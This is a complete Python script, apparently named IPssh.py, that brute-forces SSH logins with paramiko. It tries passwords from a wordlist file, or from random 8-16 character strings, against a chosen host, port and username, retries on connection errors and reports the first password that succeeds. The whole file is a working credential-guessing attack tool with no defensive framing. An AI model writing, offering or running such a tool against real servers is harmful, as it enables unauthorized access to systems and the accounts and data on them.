import paramiko
import sys
import string
import random
import time
from datetime import datetime
from rich.progress import Progress, BarColumn, TextColumn

# ANSI Escape sequences to control the cursor
CLEAR_LINE = "\033[K"
HIDE_CURSOR = "\033[?25l"
SHOW_CURSOR = "\033[?25h"

def try_ssh_connect(host, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port, username, password, timeout=5)
        return True
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException as e:
        print(f"SSH Fehler: {e}")
        time.sleep(5)  # Sleep for a while before retrying
        return try_ssh_connect(host, port, username, password)
    except Exception as e:
        print(f"Allgemeiner Fehler: {e}")
        return False
    finally:
        client.close()

def brute_force_ssh(host, port, username, password_list):
    total_attempts = len(password_list)
    
    # Hide cursor for a cleaner interface
    print(HIDE_CURSOR)
    with Progress(TextColumn("[progress.description]{task.description}"),
                   BarColumn(),
                   TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
        
        task = progress.add_task("Processing...", total=total_attempts)

        for attempt, password in enumerate(password_list):
            start_time = datetime.now().strftime('%H:%M:%S')
            # Print the password attempt
            print(f"{CLEAR_LINE}{attempt + 1} | [{start_time}] -- Trying password: {password}")
            if try_ssh_connect(host, port, username, password):
                end_time = datetime.now().strftime('%H:%M:%S')
                print(f"{CLEAR_LINE}↳ | [{end_time}] -- Success with password: {password}")
                break
            else:
                end_time = datetime.now().strftime('%H:%M:%S')
                print(f"{CLEAR_LINE}↳ | [{end_time}] -- Failed")

            # Update the progress bar
            progress.update(task, advance=1)

        print(SHOW_CURSOR)

    print("Brute force process completed.")

def generate_random_passwords(min_length, max_length, count):
    characters = string.ascii_letters + string.digits  # + string.punctuation
    passwords = []
    for _ in range(count):
        length = random.randint(min_length, max_length)
        password = ''.join(random.choice(characters) for _ in range(length))
        passwords.append(password)
    return passwords

if __name__ == "__main__":
    if len(sys.argv) < 5 or (sys.argv[4] == "-r" and len(sys.argv) > 6):
        print("Usage: python3 IPssh.py <host> <port> <username> <password_list_file | -r> <optional: count>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    username = sys.argv[3]
    password_source = sys.argv[4]

    if password_source == "-r":
        count = int(sys.argv[5]) if len(sys.argv) == 6 else 100  # Default number of random passwords
        passwords = generate_random_passwords(8, 16, count)  # Password length between 8 and 16 characters
    else:
        try:
            with open(password_source, 'r') as f:
                passwords = [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError:
            print(f"File {password_source} not found.")
            sys.exit(1)

    brute_force_ssh(host, port, username, passwords)

